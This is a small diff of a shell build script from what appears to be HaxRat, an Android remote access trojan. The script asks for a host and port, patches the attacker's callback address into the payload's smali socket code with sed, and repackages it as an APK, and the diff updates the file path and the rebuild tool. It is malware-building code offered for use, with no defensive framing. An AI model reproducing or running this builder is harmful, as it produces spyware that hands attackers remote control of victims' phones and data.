@@ -1,6 +1,6 @@
 #!/usr/bin/env sh
 
-smaliFile="smali/com/hax4us/haxrat/IOSocket.smali"
+smaliFile="smali/classes/com/hax4us/haxrat/IOSocket.smali"
 
 if [ -d $PREFIX/share/haxrat -a -d $HOME/haxRat ]; then
     echo "[!] You installed haxrat by both TermuxBlack and Github so please remove anyone first"
@@ -16,4 +16,4 @@ read -p "[*] PORT : " port
 
 sed -i "s#http.*#http://$host:$port?model=\"#" $appPath/$smaliFile
 
-apkmod -R "$appPath" -o ~/haxrat/haxRat.apk
+apkeditor b -i "$appPath" -o ~/haxrat/haxRat.apk
